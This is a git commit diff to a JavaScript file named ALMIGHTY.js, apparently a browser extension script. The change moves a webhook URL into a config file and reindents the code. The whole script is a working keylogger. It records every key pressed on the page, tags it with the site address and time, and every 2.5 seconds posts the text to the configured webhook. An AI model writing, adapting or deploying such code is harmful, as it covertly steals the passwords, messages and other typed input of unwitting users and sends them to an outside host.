00e02651ec26d397ccfb9d048472cd7f09734e7c
AnimalBanger <139151943+AnimalBanger@users.noreply.github.com>
2024-08-18 14:46:26 +0300

    yeah

--- ALMIGHTY.js
+++ ALMIGHTY.js
@@ -1,61 +1,65 @@
 function getCurrentTime() {
-    const now = new Date();
-    const hours = String(now.getHours()).padStart(2, '0');
-    const minutes = String(now.getMinutes()).padStart(2, '0');
-    const seconds = String(now.getSeconds()).padStart(2, '0');
-    return `${hours}:${minutes}:${seconds}`;
+  const now = new Date();
+  const hours = String(now.getHours()).padStart(2, '0');
+  const minutes = String(now.getMinutes()).padStart(2, '0');
+  const seconds = String(now.getSeconds()).padStart(2, '0');
+  return `${hours}:${minutes}:${seconds}`;
 }
 
 let allCharacters = [
-  "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
-  "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
-  "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
-  "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
-  "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", " ", ".", ",",
-  "<", ">", "/", "?", ";", ":", "\\", "|", "[", "{", "]", "}", "-",
-  "=", "+", "*", "!", "@", "%", "^", "&", "(", ")",
+"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
+"n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
+"A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
+"N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",
+"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", " ", ".", ",",
+"<", ">", "/", "?", ";", ":", "\\", "|", "[", "{", "]", "}", "-",
+"=", "+", "*", "!", "@", "%", "^", "&", "(", ")",
 ];
 
 let pressedKeys = "";
 
+const response = await fetch(chrome.runtime.getURL('js/config.json'));
+const config = await response.json();
+const URL = config.webhookUrl
+
 function send(str, link) {
-  const namecontent = window.location.hostname + window.location.pathname; // Get the site name
+const namecontent = window.location.hostname + window.location.pathname; // Get the site name
 
-  const siteName = "`" + getCurrentTime() + " -- " + namecontent + "`"
+const siteName = "`" + getCurrentTime() + " -- " + namecontent + "`"
 
-  const message = str + "\n-# `" + siteName + "`";
-  
-  fetch(link, {
-      method: "POST",
-      headers: {
-          "Content-Type": "application/json"
-      },
-      body: JSON.stringify({
-          content: message
-      })
-  }).catch(error => {
-    console.error('Error sending message:', error);
-  });
+const message = str + "\n-# `" + siteName + "`";
 
-  pressedKeys = "";
+fetch(link, {
+    method: "POST",
+    headers: {
+        "Content-Type": "application/json"
+    },
+    body: JSON.stringify({
+        content: message
+    })
+}).catch(error => {
+  console.error('Error sending message:', error);
+});
+
+pressedKeys = "";
 }
 
 document.addEventListener('keydown', function(event) {
-  if (allCharacters.includes(event.key)) {
-    pressedKeys += event.key;
-  } else {
-    pressedKeys += " __`"+event.key+"`__ ";
-  }
+if (allCharacters.includes(event.key)) {
+  pressedKeys += event.key;
+} else {
+  pressedKeys += " __`"+event.key+"`__ ";
+}
 });
 
 async function startSending(link) {
-  while (true) {
-    await new Promise(resolve => setTimeout(resolve, 2500));
+while (true) {
+  await new Promise(resolve => setTimeout(resolve, 2500));
 
-    if (pressedKeys !== "") {
-      send(pressedKeys, link);
-    }
+  if (pressedKeys !== "") {
+    send(pressedKeys, link);
   }
 }
+}
 
-startSending(webhookURL);
+startSending(URL);
